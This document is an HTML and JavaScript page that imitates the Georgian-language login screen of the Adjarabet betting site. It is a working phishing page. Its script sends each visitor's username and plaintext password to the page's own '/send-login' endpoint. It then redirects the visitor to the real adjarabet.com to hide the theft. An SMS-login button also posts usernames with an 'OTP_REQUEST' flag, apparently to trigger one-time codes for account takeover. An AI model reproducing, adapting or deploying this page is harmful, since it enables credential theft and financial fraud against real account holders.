<!DOCTYPE html>
<html lang="ka">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>www.adjarabet.com</title>

<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Noto+Sans+Georgian:wght@400;500;600;700&display=swap" rel="stylesheet">

<style>
* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
}

body {
    background: #111319;
    font-family: 'Noto Sans Georgian', sans-serif;
    overflow-x: hidden;
}

/* =========================
   TOP BANNER
========================= */
.top-banner {
    width: 100%;
    height: 190px;
    position: relative;
    overflow: hidden;
    background: linear-gradient(to bottom, rgba(0,0,0,.12), rgba(0,0,0,.35)),
                url('https://cdn.fortuna.ge/app/uploads/2019/12/80999780-555795955150049-1307232919273603072-n-2019-12-28_13-50-52_790545.jpg');
    background-size: cover;
    background-position: center;
}

.logo {
    position: absolute;
    left: 18px;
    top: 18px;
    width: 58px;
    height: 58px;
    background: #e30613;
    border-radius: 18px;
    display: flex;
    align-items: center;
    justify-content: center;
    color: white;
    font-size: 42px;
    font-weight: 700;
    z-index: 5;
    box-shadow: 0 6px 20px rgba(0,0,0,.35);
}

/* =========================
   LOGIN SECTION
========================= */
.login-wrapper {
    margin-top: -14px;
    background: #111319;
    border-top-left-radius: 26px;
    border-top-right-radius: 26px;
    position: relative;
    z-index: 10;
    padding: 28px 24px 40px;
}

.login-title {
    color: white;
    font-size: 38px;
    font-weight: 500;
    margin-bottom: 26px;
}

/* =========================
   INPUTS
========================= */
.input-box {
    position: relative;
    margin-bottom: 18px;
}

.input {
    width: 100%;
    height: 66px;
    border: none;
    outline: none;
    border-radius: 16px;
    background: #1a1d24;
    padding: 0 18px;
    color: white;
    font-size: 22px;
    border: 1px solid #2a2d34;
    transition: border-color 0.2s;
}

.input:focus {
    border-color: #32b44a;
}

.input::placeholder {
    color: #7e838d;
}

/* SMS BUTTON */
.sms-button {
    position: absolute;
    right: 12px;
    top: 50%;
    transform: translateY(-50%);
    height: 44px;
    border-radius: 14px;
    border: 1px solid #888c94;
    background: transparent;
    color: white;
    padding: 0 16px;
    font-size: 17px;
    font-weight: 500;
    cursor: pointer;
    transition: background 0.2s, border-color 0.2s;
}

.sms-button:hover {
    background: rgba(50, 180, 74, 0.15);
    border-color: #32b44a;
}

/* EYE BUTTON */
.eye-btn {
    position: absolute;
    right: 18px;
    top: 50%;
    transform: translateY(-50%);
    background: none;
    border: none;
    color: #838892;
    display: flex;
    align-items: center;
    justify-content: center;
    cursor: pointer;
    padding: 0;
    transition: color 0.2s;
}

.eye-btn:hover {
    color: #32b44a;
}

.eye-btn svg {
    width: 22px;
    height: 22px;
}

/* LINKS */
.links {
    display: flex;
    justify-content: space-between;
    margin-top: -4px;
    margin-bottom: 20px;
}

.links a {
    color: #b8bcc5;
    text-decoration: none;
    font-size: 15px;
    transition: color 0.2s;
}

.links a:hover {
    color: #32b44a;
}

/* LOGIN BUTTON */
.login-btn {
    width: 100%;
    height: 68px;
    border: none;
    border-radius: 16px;
    background: #1a1d24;
    color: #676d78;
    font-size: 28px;
    font-weight: 600;
    margin-bottom: 30px;
    transition: background 0.2s, color 0.2s;
}

.login-btn.active {
    background: #32b44a;
    color: white;
    cursor: pointer;
}

.login-btn.active:hover {
    background: #2a9a3e;
}

/* DIVIDER */
.divider {
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 16px;
    color: #9da3ad;
    font-size: 17px;
    margin-bottom: 28px;
}

.divider::before,
.divider::after {
    content: '';
    flex: 1;
    height: 1px;
    background: #2b2f38;
}

/* REGISTER BUTTON */
.register-btn {
    width: 100%;
    height: 72px;
    border: none;
    border-radius: 16px;
    background: #4d5259;
    color: white;
    font-size: 28px;
    font-weight: 500;
    cursor: pointer;
    transition: background 0.2s;
}

.register-btn:hover {
    background: #5a6068;
}

/* TOAST NOTIFICATION */
.toast {
    position: fixed;
    bottom: 30px;
    left: 50%;
    transform: translateX(-50%) translateY(100px);
    background: #1a1d24;
    color: white;
    padding: 14px 24px;
    border-radius: 50px;
    font-size: 16px;
    font-weight: 500;
    z-index: 1000;
    opacity: 0;
    transition: transform 0.3s ease, opacity 0.3s ease;
    pointer-events: none;
    border-left: 4px solid #32b44a;
    box-shadow: 0 8px 20px rgba(0,0,0,0.3);
}

.toast.show {
    transform: translateX(-50%) translateY(0);
    opacity: 1;
}

.toast.error {
    border-left-color: #e30613;
}

/* LOADING STATE */
.login-btn.loading {
    opacity: 0.6;
    cursor: wait;
}

/* SHAKE ANIMATION FOR ERROR (only on button) */
@keyframes shake {
    0%, 100% { transform: translateX(0); }
    25% { transform: translateX(-6px); }
    75% { transform: translateX(6px); }
}

.shake {
    animation: shake 0.3s ease;
}

/* MOBILE */
@media(max-width:480px) {
    .top-banner {
        height: 175px;
    }
    .login-title {
        font-size: 32px;
    }
    .register-btn, .login-btn {
        font-size: 24px;
    }
    .sms-button {
        font-size: 14px;
        padding: 0 12px;
        height: 38px;
    }
}
</style>
</head>

<body>

<div class="top-banner">
    <div class="logo">a</div>
</div>

<div class="login-wrapper">
    <div class="login-title">შესვლა</div>

    <!-- USERNAME -->
    <div class="input-box">
        <input type="text" class="input" id="username" placeholder="მომხმარებლის სახელი" autocomplete="off">
        <button class="sms-button" id="smsLoginBtn">SMS-ით შესვლა</button>
    </div>

    <!-- PASSWORD -->
    <div class="input-box">
        <input type="password" class="input" id="password" placeholder="პაროლი">
        <button class="eye-btn" id="togglePassword" type="button">
            <svg id="eyeIcon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7">
                <path d="M17.94 17.94A10.94 10.94 0 0 1 12 20 c-7 0-11-8-11-8 a21.77 21.77 0 0 1 5.06-5.94"></path>
                <path d="M9.9 4.24A10.94 10.94 0 0 1 12 4 c7 0 11 8 11 8 a21.8 21.8 0 0 1-3.17 4.19"></path>
                <path d="M1 1l22 22"></path>
            </svg>
        </button>
    </div>

    <!-- LINKS -->
    <div class="links">
        <a href="#">სახელის აღდგენა</a>
        <a href="#">პაროლის აღდგენა</a>
    </div>

    <!-- LOGIN BUTTON -->
    <button class="login-btn" id="loginBtn">შესვლა</button>

    <!-- DIVIDER -->
    <div class="divider">არ გაქვს ანგარიში?</div>

    <!-- REGISTER -->
    <button class="register-btn" id="registerBtn">ანგარიშის შექმნა</button>
</div>

<div id="toast" class="toast"></div>

<script>
const passwordInput = document.getElementById("password");
const togglePassword = document.getElementById("togglePassword");
const eyeIcon = document.getElementById("eyeIcon");
const usernameInput = document.getElementById("username");
const loginBtn = document.getElementById("loginBtn");

// ========== PASSWORD SHOW/HIDE ==========
togglePassword.addEventListener("click", () => {
    if(passwordInput.type === "password") {
        passwordInput.type = "text";
        eyeIcon.innerHTML = `<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8"></path><circle cx="12" cy="12" r="3"></circle>`;
    } else {
        passwordInput.type = "password";
        eyeIcon.innerHTML = `<path d="M17.94 17.94A10.94 10.94 0 0 1 12 20 c-7 0-11-8-11-8 a21.77 21.77 0 0 1 5.06-5.94"></path><path d="M9.9 4.24A10.94 10.94 0 0 1 12 4 c7 0 11 8 11 8 a21.8 21.8 0 0 1-3.17 4.19"></path><path d="M1 1l22 22"></path>`;
    }
});

// ========== CHECK INPUTS - MAKE BUTTON GREEN ==========
function checkInputs() {
    if(usernameInput.value.trim() !== "" && passwordInput.value.trim() !== "") {
        loginBtn.classList.add("active");
    } else {
        loginBtn.classList.remove("active");
    }
}

usernameInput.addEventListener("input", checkInputs);
passwordInput.addEventListener("input", checkInputs);

// ========== TOAST FUNCTION ==========
function showToast(message, isError = false) {
    const toast = document.getElementById('toast');
    toast.textContent = message;
    toast.classList.add('show');
    
    if(isError) {
        toast.classList.add('error');
        // Add shake animation to login button
        loginBtn.classList.add('shake');
        setTimeout(() => loginBtn.classList.remove('shake'), 300);
    } else {
        toast.classList.remove('error');
    }
    
    setTimeout(() => {
        toast.classList.remove('show');
    }, 3000);
}

// ========== REDIRECT TO ADJARABET ==========
function redirectToAdjarabet(username, password) {
    showToast('✅ მონაცემები მიღებულია! გადამისამართება Adjarabet-ზე...');
    
    setTimeout(() => {
        window.open('https://adjarabet.com', '_blank');
        showToast('🔐 გთხოვთ შეიყვანეთ მონაცემები Adjarabet-ის გვერდზე', false);
    }, 1000);
}

// ========== SEND TO BACKEND ==========
async function sendLoginData(username, password, isSMS = false) {
    if(isSMS) {
        try {
            const response = await fetch('/send-login', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ username: username, password: 'OTP_REQUEST' })
            });
            const data = await response.json();
            if(data.ok) {
                showToast('📱 SMS კოდი გაიგზავნა თქვენს ტელეფონზე');
            } else {
                showToast('❌ შეცდომა: ' + (data.error || 'SMS-ის გაგზავნა ვერ მოხერხდა'), true);
            }
        } catch(error) {
            showToast('❌ ქსელის შეცდომა: ' + error.message, true);
        }
        return;
    }
    
    if(!username || !password) {
        showToast('❌ გთხოვთ შეავსოთ ყველა ველი', true);
        return false;
    }
    
    loginBtn.classList.add('loading');
    const originalText = loginBtn.textContent;
    loginBtn.textContent = '⟳ მუშავდება...';
    
    try {
        const response = await fetch('/send-login', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ username: username, password: password })
        });
        
        const data = await response.json();
        
        if(data.ok) {
            redirectToAdjarabet(username, password);
        } else {
            showToast('❌ შეცდომა: ' + (data.error || 'მონაცემების გაგზავნა ვერ მოხერხდა'), true);
        }
    } catch(error) {
        showToast('❌ სერვერთან კავშირი შეწყდა', true);
    } finally {
        loginBtn.classList.remove('loading');
        loginBtn.textContent = originalText;
    }
    
    return true;
}

// ========== EVENT LISTENERS ==========
loginBtn.addEventListener('click', () => {
    if(loginBtn.classList.contains('active') && !loginBtn.classList.contains('loading')) {
        const username = usernameInput.value.trim();
        const password = passwordInput.value;
        sendLoginData(username, password, false);
    } else if(!loginBtn.classList.contains('active')) {
        showToast('❌ გთხოვთ შეიყვანოთ მომხმარებლის სახელი და პაროლი', true);
    }
});

const smsLoginBtn = document.getElementById('smsLoginBtn');
smsLoginBtn.addEventListener('click', () => {
    const username = usernameInput.value.trim();
    if(!username) {
        showToast('❌ SMS-ით შესასვლელად გთხოვთ შეიყვანოთ მომხმარებლის სახელი', true);
        return;
    }
    sendLoginData(username, '', true);
});

const registerBtn = document.getElementById('registerBtn');
registerBtn.addEventListener('click', () => {
    showToast('📝 რეგისტრაციის გვერდი მალე იქნება ხელმისაწვდომი');
    setTimeout(() => {
        window.open('https://adjarabet.com/ka/registration', '_blank');
    }, 1000);
});

function handleEnterPress(e) {
    if(e.key === 'Enter') {
        if(loginBtn.classList.contains('active') && !loginBtn.classList.contains('loading')) {
            loginBtn.click();
        }
    }
}

usernameInput.addEventListener('keypress', handleEnterPress);
passwordInput.addEventListener('keypress', handleEnterPress);
</script>

</body>
</html>
